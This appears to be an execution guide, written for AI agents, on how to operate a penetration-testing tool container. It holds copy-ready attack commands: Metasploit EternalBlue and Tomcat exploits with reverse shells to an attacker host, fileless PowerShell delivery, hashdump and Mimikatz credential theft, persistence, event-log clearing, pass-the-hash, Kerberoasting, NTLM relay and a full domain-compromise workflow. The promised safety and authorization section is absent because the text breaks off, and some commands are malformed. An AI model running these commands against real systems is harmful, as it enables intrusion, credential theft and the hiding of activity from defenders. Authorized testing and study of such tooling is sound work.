# RTPI Security Tools - Execution Guidance for Agentic Operators

## Document Purpose
This guide provides comprehensive execution context for AI agents and automated operators working with RTPI's security tooling container. It covers tool capabilities, common workflows, command patterns, and operational best practices for penetration testing and red team operations.

**Container**: `rtpi-tools` (based on Ubuntu 22.04)
**User Context**: `rtpi-tools` (non-root with sudo access)
**Working Directory**: `/home/rtpi-tools`

---

## Table of Contents
1. [Reconnaissance & Attack Surface Discovery](#reconnaissance--attack-surface-discovery)
2. [Vulnerability Scanning](#vulnerability-scanning)
3. [Network Scanning & Service Enumeration](#network-scanning--service-enumeration)
4. [Web Application Testing](#web-application-testing)
5. [Exploitation Frameworks](#exploitation-frameworks)
6. [Active Directory & Windows Testing](#active-directory--windows-testing)
7. [Credential Attacks](#credential-attacks)
8. [Post-Exploitation](#post-exploitation)
9. [Operational Workflows](#operational-workflows)
10. [Safety & Authorization Requirements](#safety--authorization-requirements)

---

## Reconnaissance & Attack Surface Discovery

### BBOT (BlackLantern Security OSINT Tool)
**Purpose**: Comprehensive attack surface reconnaissance and subdomain enumeration
**Installation**: Python package with asyncpg dependency
**Command**: `bbot`

#### Key Capabilities
- Subdomain enumeration (finds 20-50% more than other tools)
- Asset discovery (domains, IPs, URLs, ports)
- Technology detection
- Certificate transparency monitoring
- External/internal attack surface mapping

#### 7 Essential BBOT Commands

**1. Basic Subdomain Enumeration (Fast)**:
```bash
# Most common use case - subdomain discovery
bbot -t example.com -f subdomain-enum -y --no-deps --json
```

**2. Passive Reconnaissance Only**:
```bash
# No active scanning - uses only passive sources (stealthy)
bbot -t example.com -f passive-only -y --no-deps --json
```

**3. Full Attack Surface Mapping**:
```bash
# Kitchen sink - all modules (SLOW: 30-60+ min per target)
bbot -t example.com -p kitchen-sink --allow-deadly -y -v --no-deps --json
```

**4. Technology Stack Identification**:
```bash
# Identify web technologies and certificates
bbot -t example.com -m httpx,sslcert,wappalyzer,baddns -y --json
```

**5. Multiple Target Scan**:
```bash
# Scan multiple targets from file
bbot -t example.com -t example2.com -t example3.com -f subdomain-enum -y --json

# Or from file
bbot -l targets.txt -f subdomain-enum -y --json -o bbot-results/
```

**6. Cloud Asset Discovery**:
```bash
# Find cloud resources (AWS, Azure, GCP)
bbot -t example.com -m azure_tenant,github_org,oauth,bucket_amazon,bucket_azure,bucket_gcp -y --json
```

**7. Web Crawler + Screenshot**:
```bash
# Crawl websites and take screenshots
bbot -t example.com -m httpx,excavate,gowitness -y --json
# Note: gowitness requires additional setup for screenshots
```

**Bonus - Custom Module Selection**:
```bash
# DNS-focused scan
bbot -t example.com -m crt,dnsbimi,dnsdumpster,dnscaa,fullhunt,hackertarget -y --json

# API/Certificate discovery
bbot -t example.com -m crt,certspotter,otx,sslcert,urlscan -y --json
```

**Output Formats**:
- `--json`: Machine-readable JSON events (one per line)
- `--csv`: CSV output for spreadsheets
- `-o output_dir`: Save results to directory

**Performance Notes**:
- Default: Balanced speed and thoroughness
- Kitchen-sink preset: Can take 30-60+ minutes per target
- Many modules require API keys (stored in BBOT config)

**RTPI Integration**:
- Used by `server/services/bbot-executor.ts`
- Stores results in `discoveredAssets` and `discoveredServices` tables
- Automatically categorizes by type (domain, IP, URL, port)

#### Event Types Returned
```json
{"type": "DNS_NAME", "data": "subdomain.example.com", "scope_distance": 0}
{"type": "IP_ADDRESS", "data": "1.2.3.4"}
{"type": "OPEN_TCP_PORT", "data": "example.com:443"}
{"type": "URL", "data": "https://example.com/api"}
{"type": "TECHNOLOGY", "data": "nginx/1.18.0"}
```

#### Best Practices for Agents
1. **Start with targeted scans**: Use `-f subdomain-enum` instead of kitchen-sink
2. **Filter by scope**: Use `-w` (whitelist) to stay in scope
3. **Timeout awareness**: Large scans can exceed Docker execution timeouts
4. **Parse events incrementally**: JSON output is line-delimited, parse as stream
5. **Handle API key errors**: Many modules soft-fail without API keys (expected)

---

## Vulnerability Scanning

### Nuclei (ProjectDiscovery Vulnerability Scanner)
**Purpose**: Fast, template-based vulnerability scanning
**Installation**: Binary at `/usr/local/bin/nuclei`
**Templates**: `~/nuclei-templates/` (3,600+ CVEs, 900+ vulnerabilities)

#### Key Capabilities
- CVE detection (historical and current)
- Misconfiguration identification
- Technology-specific vulnerabilities
- Custom template creation
- JSONL output for automation

#### Template Organization
```
nuclei-templates/
├── http/
│   ├── cves/           # 3,624 CVE templates (LARGE SET)
│   ├── vulnerabilities/ # 923 vulnerability templates
│   ├── misconfiguration/
│   ├── exposures/
│   └── technologies/
├── network/
├── dns/
└── ssl/
```

#### 7 Essential Nuclei Commands

**1. Quick Misconfiguration Scan (Fast: 1-3 min)**:
```bash
# Most common misconfigurations - fast baseline scan
nuclei -u \
  -t nuclei-templates/http/misconfiguration/ \
  -severity critical,high,medium \
  -c 50 -bulk-size 50 -pc 50 \
  -jsonl -silent -disable-update-check
```

**2. Current Year CVE Scan Only (Moderate: 5-10 min)**:
```bash
# Focus on recent CVEs (2024/2025) instead of all 3,600
nuclei -u https://example.com \
  -t nuclei-templates/http/cves/2024/ \
  -t nuclei-templates/http/cves/2025/ \
  -severity critical,high \
  -c 50 -bulk-size 50 -pc 50 \
  -jsonl -silent -disable-update-check
```

**3. Full CVE + Vulnerability Scan (Slow: 30-60+ min)**:
```bash
# Comprehensive scan - all CVEs and vulnerabilities
nuclei -u https://example.com \
  -t nuclei-templates/http/cves/ \
  -t nuclei-templates/http/vulnerabilities/ \
  -severity critical,high \
  -c 50 -bulk-size 50 -pc 50 -rate-limit 50 \
  -jsonl -silent -disable-update-check
```

**4. Technology-Specific Targeted Scan**:
```bash
# Use tags to scan only relevant templates
nuclei -u https://example.com \
  -tags apache,nginx,wordpress,jira,jenkins \
  -severity high,critical \
  -c 50 -bulk-size 50 -pc 50 \
  -jsonl -silent -disable-update-check
```

**5. Multiple Targets from File**:
```bash
# Scan list of URLs/domains
nuclei -l targets.txt \
  -t nuclei-templates/http/cves/2024/ \
  -severity critical,high \
  -c 50 -bulk-size 50 -pc 50 \
  -jsonl -silent -o nuclei-results.json
```

**6. Exposure Detection (API Keys, Config Files)**:
```bash
# Find exposed secrets and sensitive files
nuclei -u https://example.com \
  -t nuclei-templates/http/exposures/ \
  -c 50 -bulk-size 50 -pc 50 \
  -jsonl -silent -disable-update-check
```

**7. Workflow-Based Scanning (Advanced)**:
```bash
# Run detection + exploitation workflows
nuclei -u https://example.com \
  -t nuclei-templates/workflows/ \
  -severity critical,high \
  -c 50 -bulk-size 50 -pc 50 \
  -jsonl -silent -disable-update-check
```

**Bonus - Custom Template Scan**:
```bash
# Scan with specific CVE template
nuclei -u https://example.com \
  -t nuclei-templates/http/cves/2024/CVE-2024-1234.yaml \
  -jsonl -silent

# Scan with custom template file
nuclei -u https://example.com \
  -t /path/to/custom-template.yaml \
  -jsonl -silent
```

#### JSONL Output Format
```json
{
  "template": "CVE-2024-1234",
  "template-id": "CVE-2024-1234",
  "template-path": "/home/rtpi-tools/nuclei-templates/http/cves/2024/CVE-2024-1234.yaml",
  "info": {
    "name": "Example Vulnerability",
    "severity": "high",
    "description": "Description of vulnerability",
    "classification": {
      "cve-id": ["CVE-2024-1234"],
      "cvss-score": 8.5,
      "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    }
  },
  "type": "http",
  "host": "https://example.com",
  "matched-at": "https://example.com/vulnerable-endpoint",
  "timestamp": "2026-01-16T12:00:00Z"
}
```

#### Scan Time Estimates (After Optimization)

| Template Set | Single Target | 3 Targets | 5 Targets |
|--------------|---------------|-----------|-----------|
| CVEs only (3,624) | 15-25 min | 30-45 min | 45-75 min |
| Vulnerabilities only (923) | 5-10 min | 10-20 min | 15-30 min |
| Both CVEs + Vulns | 20-35 min | 40-65 min | 60-95 min |
| Specific templates (10-50) | 1-3 min | 2-5 min | 3-8 min |

#### RTPI Integration
- Used by `server/services/nuclei-executor.ts`
- Timeout: 2 hours (7200000ms) for large template sets
- Auto-resolves template paths: `cves/` → `nuclei-templates/http/cves/`
- Stores results in `vulnerabilities` table with CVSS scores

#### Best Practices for Agents
1. **Always use severity filters**: `-severity critical,high` to reduce noise
2. **Start with small template sets**: Test with specific templates first
3. **Expect long run times**: Full CVE scans take 30-60+ minutes
4. **Parse JSONL incrementally**: One JSON object per line
5. **Template path resolution**: Use relative paths like `cves/` (auto-prefixed)
6. **Rate limiting**: Respect target infrastructure with `-rate-limit`
7. **Timeout handling**: Ensure Docker execution timeout is ≥2 hours

---

## Network Scanning & Service Enumeration

### Nmap (Network Mapper)
**Purpose**: Network discovery and security auditing
**Installation**: APT package
**Command**: `nmap`

#### Common Scan Types

**Host Discovery**:
```bash
# Ping sweep (are hosts alive?)
Rnmap -sn 192.168.1.0/24

# Skip ping (scan even if host appears down)
nmap -Pn target.com
```

**Port Scanning**:
```bash
# Top 1000 ports (fast)
nmap target.com

# All 65535 ports (thorough but slow)
nmap -p- target.com

# Specific ports
nmap -p 22,80,443,8080 target.com

# Common TCP and UDP ports
nmap -sS -sU -p T:80,443,U:53,161 target.com
```

**Service Version Detection**:
```bash
# Detect service versions (crucial for exploitation)
nmap -sV target.com

# Aggressive detection
nmap -A target.com  # Version, OS, traceroute, scripts

# OS fingerprinting
nmap -O target.com
```

**Stealth & Speed Options**:
```bash
# SYN stealth scan (half-open, less detectable)
nmap -sS target.com

# Fast scan (T4 timing template)
nmap -T4 target.com

# Aggressive timing (T5, may trigger IDS)
nmap -T5 target.com
```

**Script Scanning (NSE)**:
```bash
# Default safe scripts
nmap -sC target.com

# Vulnerability scripts
nmap --script vuln target.com

# Specific script
nmap --script http-headers target.com

# All HTTP scripts
nmap --script "http-*" -p 80,443 target.com
```

**Output Formats**:
```bash
# XML (machine-readable)
nmap -oX scan.xml target.com

# Grepable (one line per host)
nmap -oG scan.gnmap target.com

# All formats
nmap -oA scan-results target.com  # .nmap, .xml, .gnmap
```

#### 7 Essential Nmap Commands

**1. Quick Host Discovery (Ping Sweep)**:
```bash
# Find live hosts on network (no port scan)
nmap -sn 192.168.1.0/24 -oA host-discovery

# Alternative without ping (assumes hosts are up)
nmap -Pn -sn 192.168.1.0/24 -oA host-discovery-no-ping
```

**2. Fast Top Ports Scan**:
```bash
# Scan top 1000 ports quickly (default)
nmap -T4 target.com -oA fast-scan

# Scan top 100 ports (even faster)
nmap -T4 --top-ports 100 target.com -oA top-100-ports
```

**3. Full TCP Port Scan (All 65535 Ports)**:
```bash
# Comprehensive but slow (~30-60 min depending on target)
nmap -T4 -p- target.com -oA full-port-scan

# Faster version with aggressive timing
nmap -T5 -p- -min-rate 1000 target.com -oA full-port-scan-fast
```

**4. Service Version Detection**:
```bash
# Detect service versions on discovered ports
nmap -sV -p 22,80,443,3306,8080 target.com -oA service-detection

# Aggressive version detection + OS detection + traceroute + scripts
nmap -A -p 22,80,443 target.com -oA aggressive-scan
```

**5. Vulnerability Scanning with Scripts**:
```bash
# Run all vulnerability detection scripts
nmap --script vuln -p 80,443 target.com -oA vuln-scan

# Specific vulnerability checks
nmap --script ssl-heartbleed,smb-vuln-ms17-010 -p 443,445 target.com -oA specific-vulns

# HTTP vulnerability scripts
nmap --script "http-*" -p 80,443 target.com -oA http-vulns
```

**6. Stealth SYN Scan (Half-Open)**:
```bash
# SYN scan - less likely to be logged (requires root/sudo)
sudo nmap -sS -T4 target.com -oA stealth-scan

# Even stealthier - slower timing
sudo nmap -sS -T2 -p- target.com -oA very-stealth-scan
```

**7. UDP + TCP Combined Scan**:
```bash
# Scan both TCP and UDP (common services)
sudo nmap -sS -sU -p T:80,443,8080,U:53,161,500 target.com -oA tcp-udp-scan

# Common UDP services only
sudo nmap -sU --top-ports 20 target.com -oA udp-top-20
```

**Bonus - Typical Pentesting Workflow**:
```bash
# Step 1: Fast port discovery
nmap -T4 -p- target.com -oA 01-port-discovery

# Step 2: Service version detection on discovered ports
nmap -sV -p $(cat 01-port-discovery.gnmap | grep open | cut -d' ' -f2 | tr '\n' ',') target.com -oA 02-service-scan

# Step 3: Vulnerability and script scanning
nmap -sV --script vuln -p <open-ports> target.com -oA 03-vuln-scan

# Step 4: OS detection
sudo nmap -O -p <open-ports> target.com -oA 04-os-detection
```

#### Best Practices for Agents
1. **Start broad, then focus**: Quick scan → detailed scan on findings
2. **Use -oA for all outputs**: Provides multiple format options
3. **Respect rate limiting**: Use `-T3` or lower for production systems
4. **Combine with BBOT**: Nmap confirms live hosts from BBOT discovery
5. **Parse XML output**: Most structured for automated analysis

---

### NBTScan & SMBClient
**Purpose**: Windows/SMB network enumeration
**Installation**: APT packages

#### NBTScan Usage
```bash
# Scan network for NetBIOS names
nbtscan 192.168.1.0/24

# Verbose output
nbtscan -v 192.168.1.0/24
```

#### SMBClient Usage
```bash
# List shares (anonymous)
smbclient -L //target.com -N

# List shares (authenticated)
smbclient -L //target.com -U username

# Connect to share
smbclient //target.com/share -U username

# Execute commands
smbclient //target.com/C$ -U username -c 'ls'
```

---

## Web Application Testing

### Gobuster
**Purpose**: Directory/file brute forcing and DNS enumeration
**Installation**: Binary at `/usr/local/bin/gobuster`

#### 7 Essential Gobuster Commands

**1. Basic Directory Brute Force**:
```bash
# Scan for common directories
gobuster dir -u https://example.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 \
  -o gobuster-dirs.txt
```

**2. File Extension Discovery**:
```bash
# Search for specific file types
gobuster dir -u https://example.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,jsp,asp,aspx,xml,json \
  -t 50 \
  -o gobuster-files.txt
```

**3. Authenticated Directory Scan**:
```bash
# Scan with authentication headers
gobuster dir -u https://example.com \
  -w wordlist.txt \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Cookie: session=abc123" \
  -t 30
```

**4. DNS Subdomain Enumeration**:
```bash
# Brute force subdomains
gobuster dns -d example.com \
  -w /usr/share/wordlists/subdomains.txt \
  -i \
  -t 50 \
  -o gobuster-subdomains.txt

# Show resolved IPs with -i flag
```

**5. Virtual Host Discovery**:
```bash
# Find virtual hosts on same IP
gobuster vhost -u https://example.com \
  -w /usr/share/wordlists/virtual-host-wordlist.txt \
  -t 50 \
  --append-domain \
  -o gobuster-vhosts.txt
```

**6. Custom Status Code Filtering**:
```bash
# Only show specific HTTP status codes
gobuster dir -u https://example.com \
  -w wordlist.txt \
  -s 200,204,301,302,307,401,403 \
  -b 404,400 \
  -t 50

# -s = show these codes
# -b = blacklist/hide these codes
```

**7. Recursive Directory Scanning**:
```bash
# Scan directories recursively (use with caution)
gobuster dir -u https://example.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html \
  -r \
  --wildcard \
  -t 30 \
  -o gobuster-recursive.txt

# -r = follow redirects
# --wildcard = handle wildcard responses
```

**Bonus - API Endpoint Discovery**:
```bash
# Find API endpoints
gobuster dir -u https://api.example.com \
  -w api-endpoints-wordlist.txt \
  -x json \
  -H "Content-Type: application/json" \
  -s 200,201,400,401,403,500 \
  -t 30
```

---

## Exploitation Frameworks

### Metasploit Framework
**Purpose**: Exploit development and execution platform
**Installation**: Full Metasploit Framework via omnibus installer
**Command**: `msfconsole`

#### Core Commands

**Starting Metasploit**:
```bash
# Interactive console
msfconsole

# Quiet mode (no banner)
msfconsole -q

# Execute resource script
msfconsole -r script.rc
```

**Searching & Selection**:
```bash
# Search exploits
msf6 > search type:exploit platform:windows

# Search by CVE
msf6 > search cve:2024-1234

# Use module
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

**Module Configuration**:
```bash
# Show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set required options
msf6 exploit(...) > set RHOSTS 192.168.1.10
msf6 exploit(...) > set LHOST 192.168.1.5

# Show targets
msf6 exploit(...) > show targets

# Show payloads
msf6 exploit(...) > show payloads

# Set payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

**Execution**:
```bash
# Check if target is vulnerable
msf6 exploit(...) > check

# Execute exploit
msf6 exploit(...) > exploit

# Run in background
msf6 exploit(...) > exploit -j
```

**Session Management**:
```bash
# List active sessions
msf6 > sessions

# Interact with session
msf6 > sessions -i 1

# Background session (from within session)
meterpreter > background
```

#### 7 Essential Metasploit Workflows

**1. Search and Exploit CVE (e.g., EternalBlue)**:
```bash
# Start Metasploit
msfconsole -q

# Search for exploit
msf6 > search ms17-010

# Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Configure
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(...) > set LHOST 192.168.1.5
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Check vulnerability first
msf6 exploit(...) > check

# Exploit
msf6 exploit(...) > exploit
```

**2. Pass-the-Hash Attack with PSExec**:
```bash
# Use PSExec module
msf6 > use exploit/windows/smb/psexec

# Set credentials (NTLM hash)
msf6 exploit(windows/smb/psexec) > set RHOSTS target-ip
msf6 exploit(...) > set SMBDomain WORKGROUP
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass aad3b435b51404eeaad3b435b51404ee:ntlm-hash

# Execute
msf6 exploit(...) > exploit
```

**3. Web Application Exploitation (Tomcat Manager)**:
```bash
# Use Tomcat exploit
msf6 > use exploit/multi/http/tomcat_mgr_upload

# Configure
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS target-ip
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set HttpUsername admin
msf6 exploit(...) > set HttpPassword password
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST attacker-ip

# Exploit
msf6 exploit(...) > exploit
```

**4. Web Delivery (Fileless Attack)**:
```bash
# PowerShell web delivery
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set TARGET 2  # PowerShell
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST attacker-ip
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > exploit

# Copy the PowerShell command and run on target:
# powershell.exe -nop -w hidden -c [command]
```

**5. Port Scanning and Service Detection (from Metasploit)**:
```bash
# TCP port scan
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > set PORTS 1-10000
msf6 auxiliary(...) > run

# SMB version detection
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# HTTP version detection
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run
```

**6. Credential Harvesting (Post-Exploitation)**:
```bash
# After getting meterpreter session

# Dump password hashes
meterpreter > hashdump

# Load Mimikatz
meterpreter > load kiwi
meterpreter > creds_all

# Dump SAM database
meterpreter > run post/windows/gather/smart_hashdump

# Search for passwords in files
meterpreter > search -f *password*.txt
```

**7. Lateral Movement with Token Impersonation**:
```bash
# In meterpreter session

# List available tokens
meterpreter > use incognito
meterpreter > list_tokens -u

# Impersonate SYSTEM or Domain Admin token
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Open new session on another target
meterpreter > run post/windows/gather/enum_domain_users
meterpreter > portfwd add -l 445 -p 445 -r next-target-ip
```

**Bonus - Import Nmap Results and Auto-Exploit**:
```bash
# Initialize database
msfdb init

# Import Nmap XML
msf6 > db_import /path/to/nmap-scan.xml

# View discovered hosts
msf6 > hosts

# View discovered services
msf6 > services

# Auto-exploit (use with caution)
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > services -p 445 -R
msf6 auxiliary(...) > run
```

#### Meterpreter Commands
```bash
# System info
meterpreter > sysinfo
meterpreter > getuid

# File system
meterpreter > ls
meterpreter > cd C:\\
meterpreter > download file.txt
meterpreter > upload payload.exe

# Process management
meterpreter > ps
meterpreter > migrate 1234

# Privilege escalation
meterpreter > getsystem

# Credential harvesting
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all

# Persistence
meterpreter > run persistence -X

# Pivoting
meterpreter > portfwd add -l 8080 -p 80 -r target-ip
```

#### Best Practices for Agents
1. **Always use `check` first**: Verify vulnerability without exploitation
2. **Resource scripts**: Automate common workflows with `.rc` files
3. **Session timeout**: Keep sessions alive with `sessions -K`
4. **Cleanup**: Remove artifacts after testing (`clearev`, remove persistence)
5. **Database**: Use `db_nmap` to import Nmap results into Metasploit

---

## Active Directory & Windows Testing

### Impacket Suite
**Purpose**: Python library for working with network protocols
**Installation**: Python package (via pip3)
**Location**: Python scripts in PATH

#### 7 Essential Impacket Commands

**1. secretsdump.py - Extract Domain Credentials**:
```bash
# Dump all domain hashes from DC (most common)
secretsdump.py 'DOMAIN/username:password@dc-ip' -just-dc

# Dump only NTLM hashes (faster)
secretsdump.py 'DOMAIN/username:password@dc-ip' -just-dc-ntlm

# Using Pass-the-Hash
secretsdump.py -hashes :ntlmhash 'DOMAIN/username@dc-ip' -just-dc

# Dump local SAM hashes (non-DC)
secretsdump.py 'username:password@target-ip'

# From offline NTDS.dit file
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Extract specific user only
secretsdump.py 'DOMAIN/username:password@dc-ip' -just-dc-user Administrator

# Output to file
secretsdump.py 'DOMAIN/username:password@dc-ip' -just-dc -outputfile domain-hashes.txt
```

**2. GetUserSPNs.py - Kerberoasting Attack**:
```bash
# List all users with SPNs
GetUserSPNs.py 'DOMAIN/username:password' -dc-ip dc-ip

# Request service tickets for cracking
GetUserSPNs.py 'DOMAIN/username:password' -dc-ip dc-ip -request

# Save tickets to file (hashcat format)
GetUserSPNs.py 'DOMAIN/username:password' -dc-ip dc-ip -request -outputfile kerberoast-hashes.txt

# Target specific user
GetUserSPNs.py 'DOMAIN/username:password' -dc-ip dc-ip -request-user svc_account
```

**3. GetNPUsers.py - AS-REP Roasting**:
```bash
# Check all users for AS-REP roasting
GetNPUsers.py 'DOMAIN/' -usersfile domain-users.txt -dc-ip dc-ip -format hashcat

# No authentication required (will find vulnerable users)
GetNPUsers.py 'DOMAIN/' -usersfile users.txt -dc-ip dc-ip

# Single user check
GetNPUsers.py 'DOMAIN/username' -dc-ip dc-ip -no-pass

# Output to file
GetNPUsers.py 'DOMAIN/' -usersfile users.txt -dc-ip dc-ip -format hashcat -outputfile asrep-hashes.txt
```

**4. psexec.py - Remote Command Execution**:
```bash
# Interactive shell (authenticated)
psexec.py 'DOMAIN/Administrator:password@target-ip'

# Execute single command
psexec.py 'DOMAIN/Administrator:password@target-ip' 'whoami'

# Pass-the-Hash attack
psexec.py -hashes :ntlmhash 'DOMAIN/Administrator@target-ip'

# Upload and execute binary
psexec.py 'DOMAIN/Administrator:password@target-ip' -file payload.exe

# Use different service name (stealthier)
psexec.py 'DOMAIN/Administrator:password@target-ip' -service-name CustomSvc
```

**5. wmiexec.py - Stealthy Remote Execution**:
```bash
# WMI-based execution (no file writes)
wmiexec.py 'DOMAIN/Administrator:password@target-ip'

# Pass-the-Hash via WMI
wmiexec.py -hashes :ntlmhash 'DOMAIN/Administrator@target-ip'

# Execute command and exit
wmiexec.py 'DOMAIN/Administrator:password@target-ip' 'ipconfig'

# Use different shell (PowerShell)
wmiexec.py 'DOMAIN/Administrator:password@target-ip' -shell-type powershell
```

**6. smbexec.py - Semi-Interactive Shell**:
```bash
# SMB-based execution (no psexec service)
smbexec.py 'DOMAIN/Administrator:password@target-ip'

# Pass-the-Hash
smbexec.py -hashes :ntlmhash 'DOMAIN/Administrator@target-ip'

# Specify share for execution
smbexec.py 'DOMAIN/Administrator:password@target-ip' -share ADMIN$
```

**7. ntlmrelayx.py - NTLM Relay Attack**:
```bash
# Basic NTLM relay to SMB
ntlmrelayx.py -t smb://target-ip -smb2support

# Relay with command execution
ntlmrelayx.py -t smb://target-ip -c "whoami" -smb2support

# Relay to multiple targets from file
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (DCSync attack)
ntlmrelayx.py -t ldap://dc-ip --escalate-user lowpriv-user

# Relay with Responder (capture + relay)
# Terminal 1: responder -I eth0 -rv
# Terminal 2: ntlmrelayx.py -tf targets.txt -smb2support
```

**Bonus - Complete Domain Compromise Workflow**:
```bash
# Step 1: Kerberoast
GetUserSPNs.py 'DOMAIN/user:pass' -dc-ip dc-ip -request -outputfile kerberoast.txt

# Step 2: Crack tickets
hashcat -m 13100 kerberoast.txt rockyou.txt

# Step 3: Dump all domain credentials
secretsdump.py 'DOMAIN/compromised-svc:password@dc-ip' -just-dc -outputfile domain-hashes.txt

# Step 4: Lateral movement via Pass-the-Hash
psexec.py -hashes :ntlmhash 'DOMAIN/Administrator@workstation-ip'
```

#### Workflow: Domain Compromise
```bash
# 1. Enumerate SPNs (Kerberoasting)
GetUserSPNs.py DOMAIN/user:pass -dc-ip dc-ip -request -outputfile tickets.txt

# 2. Crack service tickets
hashcat -m 13100 tickets.txt wordlist.txt

# 3. Dump credentials from DC
secretsdump.py 'DOMAIN/compromised-user:password@dc-ip' -just-dc

# 4. Pass-the-Hash to admin workstation
psexec.py -hashes :ntlmhash 'DOMAIN/Administrator@workstation-ip'
```

---

### BloodHound
**Purpose**: Active Directory attack path analysis
**Installation**: Git repository in `/opt/tools/BloodHound`
**Collector**: `bloodhound-python` (via pip)

#### 7 Essential BloodHound Collection Commands

**1. Standard Collection (bloodhound-python)**:
```bash
# Full data collection (most common)
bloodhound-python -c All \
  -u username -p password \
  -d domain.com \
  -dc dc.domain.com \
  -ns dc-ip

# Shorthand with domain user
bloodhound-python -c All -u 'DOMAIN\user' -p 'password' -ns dc-ip
```

**2. Stealth Collection (Minimal Queries)**:
```bash
# Reduce LDAP queries for stealth
bloodhound-python -c DCOnly \
  -u username -p password \
  -d domain.com \
  -dc dc.domain.com \
  -ns dc-ip

# Even more stealthy (no sessions)
bloodhound-python -c Group,ObjectProps \
  -u username -p password \
  -d domain.com \
  -dc dc.domain.com \
  -ns dc-ip
```

**3. Session Collection Only**:
```bash
# Collect active sessions (find logged-in admins)
bloodhound-python -c Session \
  -u username -p password \
  -d domain.com \
  -dc dc.domain.com \
  -ns dc-ip

# Session collection is time-sensitive - run multiple times
```

**4. Collection with Output Directory**:
```bash
# Save JSON files to specific directory
bloodhound-python -c All \
  -u username -p password \
  -d domain.com \
  -dc dc.domain.com \
  -ns dc-ip \
  -o /tmp/bloodhound-data/

# Files created: computers.json, users.json, groups.json, etc.
```

**5. Collection via Kerberos Ticket**:
```bash
# Use Kerberos ticket instead of password
export KRB5CCNAME=/path/to/ticket.ccache
bloodhound-python -c All \
  -k \
  -u username \
  -d domain.com \
  -dc dc.domain.com \
  -ns dc-ip

# Useful after obtaining a ticket via AS-REP roasting or Kerberoasting
```

**6. SharpHound Collection (From Windows)**:
```powershell
# All collection methods (run on domain-joined Windows)
.\SharpHound.exe -c All --zipfilename bh-data.zip

# Specific collection methods
.\SharpHound.exe -c Session,Group,LocalAdmin --zipfilename quick-scan.zip

# Stealth mode (slower but quieter)
.\SharpHound.exe -c All --Stealth --zipfilename stealth-data.zip

# Exclude domain controllers from scanning
.\SharpHound.exe -c All --ExcludeDCs --zipfilename no-dc-scan.zip

# Loop mode (collect sessions periodically)
.\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:10:00
```

**7. Collection Methods Reference**:
```bash
# Available collection methods (-c flag):
# - All: Everything (recommended for first run)
# - DCOnly: Only DC information (stealth)
# - Group: Group memberships
# - LocalGroup: Local group memberships
# - Session: Active sessions (find admins)
# - Trusts: Domain trusts
# - ACL: Access Control Lists
# - ObjectProps: Object properties
# - Container: Container information

# Combine methods
bloodhound-python -c Group,Session,ObjectProps \
  -u username -p password \
  -d domain.com \
  -dc dc.domain.com \
  -ns dc-ip
```

**Bonus - Post-Collection Analysis Queries**:
```cypher
# Import JSON files into BloodHound GUI first, then run these queries:

# 1. Find shortest path to Domain Admins from current user
MATCH p=shortestPath((u:User {name:'USER@DOMAIN.COM'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.COM'})) RETURN p

# 2. Find all Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name

# 3. Find users with DCSync rights
MATCH (u:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN u.name

# 4. Find computers where Domain Users have admin
MATCH p=(g:Group {name:'DOMAIN USERS@DOMAIN.COM'})-[:AdminTo]->(c:Computer) RETURN c.name

# 5. Find all paths from owned principals
MATCH (u:User {owned:true}), (t {highvalue:true}), p=shortestPath((u)-[*1..]->(t)) RETURN p

# 6. Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# 7. Find unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

#### Analysis Queries

Once data is imported into BloodHound GUI:

**Pre-built Queries**:
- Shortest Paths to Domain Admins
- Find All Domain Admins
- Find Computers where Domain Users are Local Admin
- Shortest Paths from Kerberoastable Users
- Shortest Paths from Owned Principals (mark compromised users)

**Custom Cypher Queries**:
```cypher
# Find all computers where a user has admin rights
MATCH (u:User {name: 'USERNAME@DOMAIN.COM'})-[r:AdminTo]->(c:Computer)
RETURN u,r,c

# Find all users with DCSync rights
MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:DCSync]->(d:Domain)
RETURN u,g,d

# Find paths from owned users to high value targets
MATCH (u:User {owned: true}), (t {highvalue: true}), p=shortestPath((u)-[*1..]->(t))
RETURN p
```

#### Best Practices
1. **Collect from domain-joined system**: Better session data
